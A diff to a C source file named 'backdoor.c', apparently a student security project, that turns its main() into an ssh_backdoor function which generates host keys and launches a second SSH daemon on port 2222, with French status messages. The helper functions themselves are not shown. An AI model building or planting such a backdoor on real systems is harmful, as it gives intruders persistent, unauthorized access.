@@ -1,6 +1,13 @@
-#include <errno.h>
+/**
+ * @file backdoor.c
+ *
+ * @author Enzocte <enzo.cateau@etudiant.univ-lr.fr>
+ * @date 2026
+ */
+
 #include <netinet/in.h>
 #include <signal.h>
+#include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -213,26 +220,26 @@ static int stop_sshd_2222(void) {
   return 0;
 }
 
-int main(int argc, char **argv) {
-  if (argc == 2 && strcmp(argv[1], "stop") == 0) {
+int ssh_backdoor(bool stop) {
+  if (stop) {
     return stop_sshd_2222() == 0 ? 0 : 1;
   }
 
   if (generate_hostkeys_if_needed() != 0) {
-    return 1;
+    return EXIT_FAILURE;
   }
 
   if (is_sshd_running_2222()) {
     printf("[=] sshd semble deja actif sur %d\n", SSH_PORT);
-    return 0;
+    return EXIT_SUCCESS;
   }
 
   if (launch_sshd_2222() != 0) {
-    return 1;
+    return EXIT_FAILURE;
   }
 
   printf("[*] Test local:\n");
   printf("    ssh -p 2222 %s@localhost\n",
          getenv("USER") ? getenv("USER") : "ton_user");
-  return 0;
+  return EXIT_SUCCESS;
 }
